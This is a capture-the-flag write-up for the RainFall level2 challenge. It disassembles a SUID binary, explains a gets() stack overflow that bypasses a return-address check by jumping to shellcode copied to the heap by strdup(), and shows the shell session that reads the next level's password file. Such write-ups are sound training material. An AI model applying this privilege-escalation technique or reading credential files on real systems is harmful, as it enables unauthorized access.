@@ -1,0 +1,117 @@
+First, examine the binary to understand its protections and behavior: 
+
+	level2@RainFall:~$ checksec --file=level2
+	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH
+	No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH
+ 
+Key observations: 
+
+     NX is disabled (stack is executable)
+     No stack canary
+     SUID binary (runs with level3 privileges)
+     
+
+Disassembling the Binary 
+
+Using GDB, disassemble the main and p functions: 
+ 
+level2@RainFall:~$ gdb -q ./level2
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804853f <+0>: push   %ebp
+   0x08048540 <+1>: mov    %esp,%ebp
+   0x08048542 <+3>: and    $0xfffffff0,%esp
+   0x08048545 <+6>: call   0x80484d4 <p>
+   0x0804854a <+11>: leave  
+   0x0804854b <+12>: ret    
+End of assembler dump.
+
+(gdb) disas p
+Dump of assembler code for function p:
+   0x080484d4 <+0>: push   %ebp
+   0x080484d5 <+1>: mov    %esp,%ebp
+   0x080484d7 <+3>: sub    $0x68,%esp
+   0x080484da <+6>: mov    0x8049860,%eax
+   0x080484df <+11>: mov    %eax,(%esp)
+   0x080484e2 <+14>: call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>: lea    -0x4c(%ebp),%eax
+   0x080484ea <+22>: mov    %eax,(%esp)
+   0x080484ed <+25>: call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>: mov    0x4(%ebp),%eax
+   0x080484f5 <+33>: mov    %eax,-0xc(%ebp)
+   0x080484f8 <+36>: mov    -0xc(%ebp),%eax
+   0x080484fb <+39>: and    $0xb0000000,%eax
+   0x08048500 <+44>: cmp    $0xb0000000,%eax
+   0x08048505 <+49>: jne    0x8048527 <p+83>
+   0x08048507 <+51>: mov    $0x8048620,%eax
+   0x0804850c <+56>: mov    -0xc(%ebp),%edx
+   0x0804850f <+59>: mov    %edx,0x4(%esp)
+   0x08048513 <+63>: mov    %eax,(%esp)
+   0x08048516 <+66>: call   0x80483a0 <printf@plt>
+   0x0804851b <+71>: movl   $0x1,(%esp)
+   0x08048522 <+78>: call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>: lea    -0x4c(%ebp),%eax
+   0x0804852a <+86>: mov    %eax,(%esp)
+   0x0804852d <+89>: call   0x80483f0 <puts@plt>
+   0x08048532 <+94>: lea    -0x4c(%ebp),%eax
+   0x08048535 <+97>: mov    %eax,(%esp)
+   0x08048538 <+100>: call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>: leave  
+   0x0804853e <+106>: ret    
+End of assembler dump.
+ 
+ 
+Vulnerability Analysis 
+
+The key vulnerabilities are: 
+
+     Buffer overflow in gets() at 0x080484ed
+     Interesting protection at 0x080484fb which checks if return address starts with 0xb
+     Call to strdup() at 0x08048538 which copies our input to the heap
+     
+
+The vulnerability exploitation path: 
+
+     We can overwrite the return address with gets()
+     We need to bypass the check that filters addresses starting with 0xb
+     We can use strdup() to copy our shellcode to the heap (which will have addresses starting with 0x08, not 0xb)
+     
+
+Finding the Buffer Offset by substracting the addresses
+Confirming an offset of 80 bytes. 
+
+Creating the Exploit 
+
+We'll: 
+
+     Place shellcode at the beginning of our buffer
+     Add a NOP sled for reliability
+     Override the return address with the address where strdup() places our shellcode on the heap
+
+See the exploit file in ressources/exploit.py
+ 
+
+level2@RainFall:~$ chmod +x /tmp/exploit.py
+ 
+ 
+Executing the Exploit 
+
+Run the exploit and get a shell with level3 privileges: 
+ 
+level2@RainFall:~$ (cat <(/tmp/exploit.py); cat) | ./level2
+# [Shellcode executes and gives us a shell]
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+ 
+ 
+Understanding the Exploitation 
+
+     Our input is read by gets() into a buffer on the stack
+     We overflow the buffer and overwrite the return address with 0x0804a008 (a heap address)
+     The protection check verifies if it starts with 0xb (it doesn't, it starts with 0x08)
+     Our buffer is printed by puts() and copied to the heap by strdup()
+     When p() returns, execution jumps to our shellcode on the heap
+     The shellcode executes and spawns a shell with level3 privileges
+     
